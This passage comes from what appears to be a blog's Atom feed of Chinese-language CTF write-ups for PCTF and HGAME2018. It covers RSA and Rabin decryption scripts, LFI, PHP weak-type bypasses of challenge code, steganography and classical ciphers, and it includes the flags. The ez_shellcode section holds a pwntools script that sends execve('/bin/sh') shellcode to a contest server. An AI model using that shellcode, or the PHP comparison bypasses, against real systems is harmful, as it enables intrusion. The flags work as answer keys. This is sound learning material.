+&lt;p&gt;$$c=(y_p⋅p⋅m_q−y_q⋅q⋅m_p)modn$$&lt;&#x2F;p&gt;
+&lt;p&gt;$$d=n−c$$&lt;&#x2F;p&gt;
+&lt;p&gt;注意：如果 $$p≡q≡3(mod4)$$，则&lt;&#x2F;p&gt;
+&lt;p&gt;$$mp=c^{\frac{1}{4}(p+1)}modp$$&lt;&#x2F;p&gt;
+&lt;p&gt;$$mq=c^{\frac14(q+1)}modq$$&lt;&#x2F;p&gt;
+&lt;p&gt;而一般情况下，$p≡q≡3(mod4)p $是满足的，对于不满足的情况下，请参考相应的算法解决。&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;pre data-lang=&quot;python&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;#!&amp;#x2F;usr&amp;#x2F;bin&amp;#x2F;python
+# coding=utf-8
+import gmpy2
+import string
+from Crypto.PublicKey import RSA
+
+# 读取公钥参数
+with open(&amp;#x27;pubkey.pem&amp;#x27;, &amp;#x27;r&amp;#x27;) as f:
+    key = RSA.importKey(f)
+    N = key.n
+    e = key.e
+with open(&amp;#x27;flag.enc&amp;#x27;, &amp;#x27;r&amp;#x27;) as f:
+    cipher = f.read().encode(&amp;#x27;hex&amp;#x27;)
+    cipher = string.atoi(cipher, base=16)
+    # print cipher
+print &amp;quot;please input p&amp;quot;
+p = int(raw_input(), 10)
+print &amp;#x27;please input q&amp;#x27;
+q = int(raw_input(), 10)
+# 计算yp和yq
+inv_p = gmpy2.invert(p, q)
+inv_q = gmpy2.invert(q, p)
+
+# 计算mp和mq
+mp = pow(cipher, (p + 1) &amp;#x2F; 4, p)
+mq = pow(cipher, (q + 1) &amp;#x2F; 4, q)
+
+# 计算a,b,c,d
+a = (inv_p * p * mq + inv_q * q * mp) % N
+b = N - int(a)
+c = (inv_p * p * mq - inv_q * q * mp) % N
+d = N - int(c)
+
+for i in (a, b, c, d):
+    s = &amp;#x27;%x&amp;#x27; % i
+    if len(s) % 2 != 0:
+        s = &amp;#x27;0&amp;#x27; + s
+    print s.decode(&amp;#x27;hex&amp;#x27;)
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h3 id=&quot;flag-25&quot;&gt;flag&lt;&#x2F;h3&gt;
+&lt;p&gt;PCTF{sp3ci4l_rsa}&lt;&#x2F;p&gt;
+</content>
+	</entry>
+	<entry xml:lang="en">
+		<title>HGAME2018-week2部分WP</title>
+		<published>2018-02-16T16:00:20+08:00</published>
+		<updated>2020-08-07T01:48:37.557765+08:00</updated>
+		<link rel="alternate" href="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/" type="text/html"/>
+		<id>https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/</id>
+		<content type="html">&lt;p&gt;菜鸟每天飞过&lt;&#x2F;p&gt;
+&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
+&lt;ul&gt;
+&lt;li&gt;Web
+&lt;ul&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
+Random?&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
+草莓社区-1&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
+草莓社区-2&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot;&#x2F;&gt;
+XSS-1&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot;&#x2F;&gt;
+XSS-2&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot;&#x2F;&gt;
+最简单的sql题&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;Rev
+&lt;ul&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot;&#x2F;&gt;
+wtfitis&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot;&#x2F;&gt;
+miaomiaowu&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot;&#x2F;&gt;
+iccanobif&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;PWN
+&lt;ul&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
+ez_shellcode&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
+ez bash jail&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot;&#x2F;&gt;
+hacker_system_ver1&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot;&#x2F;&gt;
+ez_shellcode_ver2&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;Misc
+&lt;ul&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
+咻咻咻&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
+White cosmos&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
+easy password&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
+mysterious file header&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;Crypto
+&lt;ul&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
+easy rsa&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
+the same simple RSA&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot;&#x2F;&gt;
+xasr&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
+Caesar&amp;amp;&amp;amp;Caesar&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
+violence&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;所以我到底是啥呢？想了想，应该是Web瞎做，Bin乱搞，其他RP选手……&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;web&quot;&gt;Web&lt;&#x2F;h1&gt;
+&lt;h2 id=&quot;random&quot;&gt;Random?&lt;&#x2F;h2&gt;
+&lt;p&gt;首先都提示了vim改代码，那就是源码泄露咯&lt;&#x2F;p&gt;
+&lt;p&gt;试了一下是&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week2bu-fen-wp&#x2F;snipaste20180213_175026.png&quot; alt=&quot;Random1&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;用vim读一下&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week2bu-fen-wp&#x2F;snipaste20180213_175201.png&quot; alt=&quot;Random2&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;这里的方法是构造一个对象使public和secret公用空间，方法是&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week2bu-fen-wp&#x2F;snipaste20180213_180251.png&quot; alt=&quot;Random3&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week2bu-fen-wp&#x2F;snipaste20180213_180245.png&quot; alt=&quot;Random4&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;cao-mei-she-qu-1&quot;&gt;草莓社区-1&lt;&#x2F;h2&gt;
+&lt;p&gt;LFI嘛，最简单的肯定是直接来咯&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week2bu-fen-wp&#x2F;snipaste20180213_171633.png&quot; alt=&quot;草莓社区-1&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;cao-mei-she-qu-2&quot;&gt;草莓社区-2&lt;&#x2F;h2&gt;
+&lt;p&gt;难一点的就用base64编码读咯&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week2bu-fen-wp&#x2F;snipaste20180213_172618.png&quot; alt=&quot;草莓社区-2_1&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week2bu-fen-wp&#x2F;snipaste20180213_172626.png&quot; alt=&quot;草莓社区-2_2&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;pwn&quot;&gt;PWN&lt;&#x2F;h1&gt;
+&lt;h2 id=&quot;ez-shellcode&quot;&gt;ez_shellcode&lt;&#x2F;h2&gt;
+&lt;p&gt;既然是直接执行，那找一个就好了&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;python&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;from pwn import *
+r = remote(&amp;quot;111.230.149.72&amp;quot;,10004)
+print r.recv
+payload = &amp;quot;\x6a\x0b&amp;quot;+&amp;quot;\x58&amp;quot;+&amp;quot;\x99&amp;quot;+&amp;quot;\x52&amp;quot;+&amp;quot;\x68\x2f\x2f\x73\x68&amp;quot;+&amp;quot;\x68\x2f\x62\x69\x6e&amp;quot;+&amp;quot;\x89\xe3&amp;quot;+&amp;quot;\x52&amp;quot; +&amp;quot;\x53&amp;quot;+&amp;quot;\x89\xe1&amp;quot;+&amp;quot;\xcd\x80&amp;quot;
+r.send(payload)
+r.interactive()
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h2 id=&quot;ez-bash-jail&quot;&gt;ez bash jail&lt;&#x2F;h2&gt;
+&lt;p&gt;根据视频教程&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week2bu-fen-wp&#x2F;snipaste20180214_171547.png&quot; alt=&quot;ez bash jail&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;misc&quot;&gt;Misc&lt;&#x2F;h1&gt;
+&lt;h2 id=&quot;xiu-xiu-xiu&quot;&gt;咻咻咻&lt;&#x2F;h2&gt;
+&lt;p&gt;首先是一个zip伪加密&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week2bu-fen-wp&#x2F;snipaste20180211_211448.png&quot; alt=&quot;咻咻咻1&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;解压出来以后按照https:&#x2F;&#x2F;ethackal.github.io&#x2F;2015&#x2F;10&#x2F;05&#x2F;derbycon-ctf-wav-steganography&#x2F;用Ruby来解码&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week2bu-fen-wp&#x2F;snipaste20180212_203651.png&quot; alt=&quot;咻咻咻2&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;明显是Base64，解码得flag&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;white-cosmos&quot;&gt;White cosmos&lt;&#x2F;h2&gt;
+&lt;p&gt;PWNHUB密码学专场里的签到题的套路&lt;&#x2F;p&gt;
+&lt;p&gt;打开一看0x09&#x2F;0x20心里就有底了&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week2bu-fen-wp&#x2F;snipaste20180211_204814.png&quot; alt=&quot;white cosmos1&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;因为可见字符首位应该是0，所以0x09对应0，0x20对应1&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week2bu-fen-wp&#x2F;snipaste20180211_205356.png&quot; alt=&quot;white cosmos2&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;easy-password&quot;&gt;easy password&lt;&#x2F;h2&gt;
+&lt;p&gt;没什么好说的，跑就是了&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week2bu-fen-wp&#x2F;snipaste20180211_210003.png&quot; alt=&quot;easy password&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;mysterious-file-header&quot;&gt;mysterious file header&lt;&#x2F;h2&gt;
+&lt;p&gt;首先是zip包把前四字节做了一下调整，还是比较明显的，改正常以后解压就行&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week2bu-fen-wp&#x2F;snipaste20180211_222543.png&quot; alt=&quot;mysterious file header1&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;解压出来的文件拿反编译器http:&#x2F;&#x2F;www.javadecompilers.com&#x2F;搞一下&lt;&#x2F;p&gt;
+&lt;p&gt;有用的代码为&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;java&quot; class=&quot;language-java &quot;&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&amp;#x2F;*
+ * Decompiled with CFR 0_123.
+ *&amp;#x2F;
+package GUI;
+
+import java.awt.Component;
+import java.awt.GridLayout;
+import java.awt.LayoutManager;
+import java.awt.event.ActionEvent;
+import java.awt.event.ActionListener;
+import javax.swing.JButton;
+import javax.swing.JFrame;
+import javax.swing.JPanel;
+import javax.swing.JTextArea;
+
+public class hgameGUI
+        extends JFrame {
+    private static final int DEFAULT_WIDTH = 300;
+    private static final int DEFAULT_HEIGHT = 200;
+
+    public hgameGUI() {
+        super(&amp;quot;Welcome to Hgame!&amp;quot;);
+        this.setSize(300, 200);
+        JButton flag1 = new JButton(&amp;quot;i&amp;#x27;m flag&amp;quot;);
+        JButton flag2 = new JButton(&amp;quot;i&amp;#x27;m flag, too.&amp;quot;);
+        JButton flag3 = new JButton(&amp;quot;RU kidding me? I&amp;#x27;m the true flag!&amp;quot;);
+        JButton flag4 = new JButton(&amp;quot;UR wrong, I&amp;#x27;m the true flag!&amp;quot;);
+        JTextArea flagtext = new JTextArea(&amp;quot;Want flag? Try upstairs.&amp;quot;);
+        JPanel flag = new JPanel();
+        flag.setLayout(new GridLayout(5, 1));
+        flag.add(flag1);
+        flag.add(flag2);
+        flag.add(flag3);
+        flag.add(flag4);
+        flag.add(flagtext);
+        flag1.addActionListener(event -&amp;gt; {
+                    flagtext.setText(&amp;quot;118&amp;quot;);
+                }
+        );
+        flag2.addActionListener(event -&amp;gt; {
+                    flagtext.setText(&amp;quot;54&amp;quot;);
+                }
+        );
+        flag3.addActionListener(event -&amp;gt; {
+                    flagtext.setText(&amp;quot;29&amp;quot;);
+                }
+        );
+        flag4.addActionListener(event -&amp;gt; {
+                    flagtext.setText(&amp;quot;89&amp;quot;);
+                }
+        );
+        this.add(flag);
+    }
+}
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;智障的我反应了半天才明白这是IP地址&lt;&#x2F;p&gt;
+&lt;p&gt;遍历一下顺序查一下，在中国的一个IP里找到&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week2bu-fen-wp&#x2F;snipaste20180212_211411.png&quot; alt=&quot;mysterious file header2&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week2bu-fen-wp&#x2F;snipaste20180212_211452.png&quot; alt=&quot;mysterious file header3&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;crypto&quot;&gt;Crypto&lt;&#x2F;h1&gt;
+&lt;h2 id=&quot;easy-rsa&quot;&gt;easy rsa&lt;&#x2F;h2&gt;
+&lt;p&gt;明明还是偶尔摸摸ACM的，二分都想不起来……MDZZ&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;python&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;N = 10385112853503545283534594498014002163302819192542881359629016178651814593394538223939733674125477453748418677846543570433509186453439897628509042367641638605796280506469598857872127102183624493512082415420093824666579257184064851925863532407038708153173813845163607930388067232852387553655027755138043051251085946275767001373277444643651026212284925970808939348126454571156523402419571304104957238600724334148041629955456548891850609245486162713434748801968838458008730625275388077430783612116161245037630984479400721315318755404657093206825883572149393481806067157147431981573823960963614146686202457034323040706001
+e = 65537
+c = 4371976065894333890314975885075127128451240983808800709698046359245834252220415066013588488225793488033803390795656718853587692177687489853479502247266771924035749805299269602527272036788769904108885493823764984982805025952459173246366939243972669582338728034363614943062106220697944193226897767645789368465460202024200438535770983989035642434091720020123447189714932941203953201421143816856602410516207702904806903435163191348277867475813985765685033173827201970396908439360218409562692753257235084893548449865848486681931258855329384534422245333790248671083002562017871712806386748477524316776702973435067495735891
+h = 211473031829143387075248424832701297198713292770838284307849674781204968609248808096119074157099909881957829793545784295167214864644080464847006389628006758327477845870101535232054809595189429534377867001767649036319119343001102771623484473596258682675319189568166030200094562890253995876322745344347924616750
+
+low = 1
+high = h&amp;#x2F;&amp;#x2F;2 
+mid =int((low+high))&amp;#x2F;&amp;#x2F;2
+
+while low&amp;lt;high:
+	if low*(h-low)  &amp;gt; N:
+		high = mid-1
+	else:
+		low = mid + 1
+	mid = (low+high)&amp;#x2F;&amp;#x2F;2
+
+print(low)
+print(h-low)
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;这样就有p&#x2F;q了&lt;&#x2F;p&gt;
+&lt;p&gt;后来发现这出题人一开始应该没这样想&lt;&#x2F;p&gt;
+&lt;p&gt;回头补……&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;the-same-simple-rsa&quot;&gt;The same simple RSA&lt;&#x2F;h2&gt;
+&lt;p&gt;先读一下key咯&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;$ openssl rsa -pubin -in pubkey.pem -text -modulus
+Public-Key: (256 bit)
+Modulus:
+    00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f:
+    1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f:
+    be:30:dd
+Exponent: 65537 (0x10001)
+Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD
+-----BEGIN PUBLIC KEY-----
+MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ&amp;#x2F;+5erCQKPGqxsC&amp;#x2F;bNPXDr
+yigb&amp;#x2F;+l&amp;#x2F;vjDdAgMBAAE=
+-----END PUBLIC KEY-----
+writing RSA key
+
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;256位嘛，好说了&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week2bu-fen-wp&#x2F;snipaste20180212_150022.png&quot; alt=&quot;The same simple RSA&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;然后用rsatool生成pem文件，解密得flag&lt;&#x2F;p&gt;
+&lt;p&gt;需要注意的是有了q&#x2F;p也不能直接解密，这是使用了openssl的缘故（具体的我还没了解过&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;caesar-caesar&quot;&gt;Caesar&amp;amp;&amp;amp;Caesar&lt;&#x2F;h2&gt;
+&lt;p&gt;直接在线解咯&lt;&#x2F;p&gt;
+&lt;p&gt;要分析的话，就是指数重叠+频率分析？&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;violence&quot;&gt;violence&lt;&#x2F;h2&gt;
+&lt;pre data-lang=&quot;python&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;a = &amp;quot;191709050607090519_0706_0603150519_03_0a0706_170c_1407170205101105&amp;quot;
+a = a.replace(&amp;#x27;_&amp;#x27;,&amp;#x27;&amp;#x27;)
+str = &amp;quot;&amp;quot;
+for i in range(0,int(len(a)&amp;#x2F;2)):
+	str+=chr(ord(&amp;#x27;a&amp;#x27;)+int(a[2*i]+a[2*i+1],16))
+print(str)
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;pre data-lang=&quot;python&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;from pycipher import Affine
+
+s = [1,3,5,7,9,11,15,17,19,21,23,25]
+for i in s:
+	for j in range(0,25):
+		print(Affine(a=i,b=j).encipher(&amp;#x27;zxjfghjfzhggdvfzdkhgxmuhxcfqrf&amp;#x27;).lower())
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;然后找到&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week2bu-fen-wp&#x2F;snipaste20180211_220623.png&quot; alt=&quot;violence&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+</content>
+	</entry>
+	<entry xml:lang="en">
+		<title>HGAME2018-week1WP</title>
+		<published>2018-02-08T10:17:34+08:00</published>
+		<updated>2020-08-07T01:48:37.522860+08:00</updated>
+		<link rel="alternate" href="https://CSUwangj.github.io/hgame2018-week1wp/" type="text/html"/>
+		<id>https://CSUwangj.github.io/hgame2018-week1wp/</id>
+		<content type="html">&lt;p&gt;第一周难度还是挺温柔，居然让我AK了，好开心呀&lt;&#x2F;p&gt;
+&lt;p&gt;对了，这篇是先在本地生成的，周日才传上博客的。&lt;&#x2F;p&gt;
+&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;&lt;h1 id=&quot;web&quot;&gt;Web&lt;&#x2F;h1&gt;
+&lt;h2 id=&quot;are-you-from-europe&quot;&gt;Are you from Europe?&lt;&#x2F;h2&gt;
+&lt;p&gt;第一次做这种题，还学到了一点浏览器console的用法……
+直接看源码，最开始发现在F12的console里输入quartz +=100000000有用
+然后很开心地抽卡，抽了半天感觉不对，仔细看了下概率……淦哦我是不是傻&lt;&#x2F;p&gt;
+&lt;p&gt;翻到最底下有个函数，看着就是和flag有关的样子
+&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180205_010720.png&quot; alt=&quot;Are_you_from_Europe?1&quot; &#x2F;&gt;
+代码美化一哈
+&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180205_010751.png&quot; alt=&quot;Are_you_from_Europe?2&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;special-number&quot;&gt;special number&lt;&#x2F;h2&gt;
+&lt;p&gt;源码已经放了出来&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;PHP&quot; class=&quot;language-PHP &quot;&gt;&lt;code class=&quot;language-PHP&quot; data-lang=&quot;PHP&quot;&gt;include_once(&amp;quot;flag.php&amp;quot;);
+if(isset($_GET[&amp;#x27;key&amp;#x27;])){
+    $pattern = &amp;#x27;&amp;#x2F;^(?=.*[0-9].*)(?=.*[a-zA-Z].*).{7,}$&amp;#x2F; &amp;#x27;;
+    $key = $_GET[&amp;#x27;key&amp;#x27;];
+    if(preg_match($pattern,$key)===0){
+        echo &amp;quot;格式错误&amp;quot;;
+    }else{
+        $lock=&amp;quot;******************&amp;quot;;
+        $b = json_decode($key);
+        if($b==$lock)
+            echo $flag;
+        else
+            echo &amp;quot;this is no special number&amp;quot;;
+    }
+}
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;这个题的考点就是PHP弱类型中0==string这个情况（PHP混乱邪恶无疑
+就是要让json_decode出来的结果是0，于是在沙盒http:&#x2F;&#x2F;sandbox.onlinephpfunctions[.]com&#x2F;里实验出了结果
+&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180205_215726.png&quot; alt=&quot;special_number1&quot; &#x2F;&gt;
+然后去原网页的时候还失败了一次……
+&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180205_215734.png&quot; alt=&quot;special_number2&quot; &#x2F;&gt;
+因为传入的时候会再加对引号……
+&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180205_215746.png&quot; alt=&quot;special_number3&quot; &#x2F;&gt;
+这里必须感谢一下飘零大大指点的，一开始光想着怎么绕过正则，反而偏离了正轨
+顺便正则的效果大概是需要传入的字符串既有数字又有字母长度大于6就行&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;can-u-find-me&quot;&gt;can u find me?&lt;&#x2F;h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Description 
+only robot know where is the flag&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;p&gt;那当然是robots.txt啦，这不是送？
+&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180204_201235.png&quot; alt=&quot;can_u_find_me?1&quot; &#x2F;&gt;
+直接访问看到
+&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180208_104340.png&quot; alt=&quot;can_u_find_me?2&quot; &#x2F;&gt;
+抓包看看，发现Cookie里有个user=
+补上，发出，得flag
+&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180204_201018.png&quot; alt=&quot;can_u_find_me?3&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;tell-me-what-you-want&quot;&gt;tell me what you want&lt;&#x2F;h2&gt;
+&lt;p&gt;这个题就是纯练改HTTP头的
+点进去问你想要啥，你输flag告诉你用POST更好，然后之后每改一次都会告诉你新的要改的地方，全改完得到flag
+&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180204_202350.png&quot; alt=&quot;tell_me_what_you_want&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;wo-men-bu-yi-yang&quot;&gt;我们不一样&lt;&#x2F;h2&gt;
+&lt;p&gt;还是源码放出，还是弱类型&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;PHP&quot; class=&quot;language-PHP &quot;&gt;&lt;code class=&quot;language-PHP&quot; data-lang=&quot;PHP&quot;&gt;include_once(&amp;quot;flag.php&amp;quot;);
+if (isset($_POST[&amp;#x27;str1&amp;#x27;]) &amp;amp;&amp;amp; isset($_POST[&amp;#x27;str2&amp;#x27;])) {
+
+	if ($_POST[&amp;#x27;str1&amp;#x27;] != $_POST[&amp;#x27;str2&amp;#x27;] &amp;amp;&amp;amp; strcmp($_POST[&amp;#x27;str1&amp;#x27;], $_POST[&amp;#x27;str2&amp;#x27;]) == 0) {
+		echo &amp;quot;flag is:&amp;quot;.$flag;
+		exit();
+	} else {
+		echo &amp;quot;Something wrong..&amp;quot;;
+	}
+}
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;这里的弱类型在于string和非string的strcmp返回0，而array!=string成立
+&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180204_231047.png&quot; alt=&quot;我们不一样&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;rev&quot;&gt;Rev&lt;&#x2F;h1&gt;
+&lt;h2 id=&quot;re0&quot;&gt;re0&lt;&#x2F;h2&gt;
+&lt;p&gt;拖进IDA，F5出flag
